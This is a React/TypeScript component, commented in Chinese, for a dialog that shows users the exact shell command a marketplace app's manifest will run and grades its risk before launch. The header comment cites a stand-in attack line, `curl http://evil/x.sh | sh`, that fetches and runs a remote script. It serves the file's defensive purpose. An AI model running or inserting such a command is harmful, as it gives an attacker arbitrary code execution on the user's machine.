import * as React from "react";
import { ShieldAlert, ShieldCheck, Terminal } from "lucide-react";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { cn } from "@/lib/utils";
import {
  RISK_LEVEL_HINTS,
  RISK_LEVEL_TITLES,
  type RiskLevel,
} from "@shared/appRisk";
import type { StartConfirmation } from "@shared/appTypes";

/**
 * 启动前确认框 —— 来自应用市场的项目
 *
 * ## 为什么要有它
 *
 * 清单里的 `command` 是**经 shell 执行**的（`spawn(..., shell: true)`），
 * 所以 `curl http://evil/x.sh | sh` 这种东西在清单里语法完全合法，
 * 跑起来就是任意代码执行。
 *
 * 而市场条目的清单是**别人**写的。用户点「获取」时看到的是一个应用名和
 * 一句简介，看不到真正会跑的命令 —— 除非这里把它摊开。
 *
 * ## 三档风险对应三种确认强度
 *
 * - `none` —— 直接点「运行」
 * - `caution` —— 列出可疑之处，普通确认
 * - `danger` —— 额外要求**显式勾选**「我知道风险」，否则按钮点不动
 *
 * ## 确认的不是「这个应用」，是「这份清单」
 *
 * 主进程记的是**清单内容的哈希**。清单改了（作者更新、本地被人动过），
 * 哈希就对不上，这个框会再弹一次 —— 所以它防的不只是「第一次」，
 * 也包括「清单在确认之后被换掉」。
 */
interface StartConfirmDialogProps {
  open: boolean;
  /** 需要确认的内容 —— 主进程给的 */
  confirmation: StartConfirmation | null;
  onClose: () => void;
  /** 用户确认了 —— 带上清单指纹回去 */
  onConfirm: (manifestHash: string) => void;
}

export function StartConfirmDialog({
  open,
  confirmation,
  onClose,
  onConfirm,
}: StartConfirmDialogProps) {
  const [acknowledged, setAcknowledged] = React.useState(false);

  // 每次打开都要重新勾 —— 上一次的勾选不该给下一次用
  React.useEffect(() => {
    if (open) setAcknowledged(false);
  }, [open]);

  if (!confirmation) return null;

  const level: RiskLevel = confirmation.risk.level;
  const isDanger = level === "danger";
  const canRun = !isDanger || acknowledged;

  return (
    <Dialog open={open} onOpenChange={(v) => !v && onClose()}>
      <DialogContent className="sm:max-w-[560px]">
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2">
            {isDanger ? (
              <ShieldAlert className="h-4 w-4 text-destructive shrink-0" />
            ) : (
              <ShieldCheck className="h-4 w-4 text-muted-foreground shrink-0" />
            )}
            确认运行这个应用
          </DialogTitle>
          <DialogDescription>
            这个应用来自<strong className="text-foreground/90 font-medium">应用市场</strong>
            ，它的清单是别人写的。下面是它真正会执行的命令 ——
            请确认你信任发布者，再决定要不要运行。
          </DialogDescription>
        </DialogHeader>

        {/* 命令行 —— 不截断。用户要能自己看清楚到底会跑什么，
            截断了就等于没给。 */}
        <div className="space-y-2">
          <div className="flex items-center gap-1.5 text-[11px] font-medium text-muted-foreground/80">
            <Terminal className="h-3 w-3" />
            将要执行的命令
          </div>
          <div className="rounded-md border border-border/60 bg-muted/40 px-3 py-2">
            <code className="text-[12px] font-mono text-foreground break-all whitespace-pre-wrap">
              {confirmation.commandLine}
            </code>
          </div>
        </div>

        {/* 风险分析 */}
        {confirmation.risk.findings.length > 0 ? (
          <div
            className={cn(
              "rounded-md border px-3 py-2 space-y-2",
              isDanger
                ? "border-destructive/40 bg-destructive/10"
                : "border-amber-500/40 bg-amber-500/10"
            )}
          >
            <p
              className={cn(
                "text-[12px] font-medium",
                isDanger
                  ? "text-destructive"
                  : "text-amber-700 dark:text-amber-400"
              )}
            >
              {RISK_LEVEL_TITLES[level]}
            </p>
            <p className="text-[11px] text-muted-foreground/80 leading-relaxed">
              {RISK_LEVEL_HINTS[level]}
            </p>
            <ul className="space-y-1">
              {confirmation.risk.findings.map((finding, index) => (
                <li
                  key={`${finding.rule}-${index}`}
                  className="text-[11px] text-muted-foreground/90 leading-relaxed flex gap-1.5"
                >
                  <span className="text-muted-foreground/50 shrink-0">·</span>
                  <span>{finding.reason}</span>
                </li>
              ))}
            </ul>
          </div>
        ) : (
          <div className="rounded-md border border-border/60 bg-muted/30 px-3 py-2">
            <p className="text-[11px] text-muted-foreground/80 leading-relaxed">
              {RISK_LEVEL_HINTS.none}
            </p>
          </div>
        )}

        {/* 高危时要显式勾选 —— 光点「运行」不算数 */}
        {isDanger && (
          <label className="flex items-start gap-2 cursor-pointer select-none">
            <input
              type="checkbox"
              checked={acknowledged}
              onChange={(e) => setAcknowledged(e.target.checked)}
              className="mt-0.5 h-4 w-4 shrink-0 rounded border-border accent-primary focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 focus-visible:ring-offset-background"
            />
            <span className="text-[12px] text-foreground/85 leading-relaxed">
              我知道这条命令会做什么，并且信任发布者
            </span>
          </label>
        )}

        <DialogFooter>
          <Button variant="outline" onClick={onClose} className="btn-hover">
            取消
          </Button>
          <Button
            variant={isDanger ? "destructive" : "default"}
            disabled={!canRun}
            onClick={() => onConfirm(confirmation.manifestHash)}
            className="btn-hover"
          >
            运行
          </Button>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  );
}
